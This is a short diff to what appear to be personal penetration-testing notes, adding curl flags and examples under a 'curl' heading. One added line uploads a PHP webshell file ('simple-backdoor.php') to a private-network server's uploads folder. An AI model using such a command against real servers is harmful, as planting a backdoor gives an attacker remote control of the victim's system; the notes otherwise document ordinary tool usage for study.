@@ -61,6 +61,11 @@ similar to browsh, more text oriented
 
 ## curl
 grabs the page from url
+- `curl -v http:www.google.com`
+- -I : get HEAD only
+- -v : verbose
+- -X OPTIONS : supported methods
+- `curl http://192.168.8.1/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php` : upload a file
 
 ## wget 
 grabs files from url
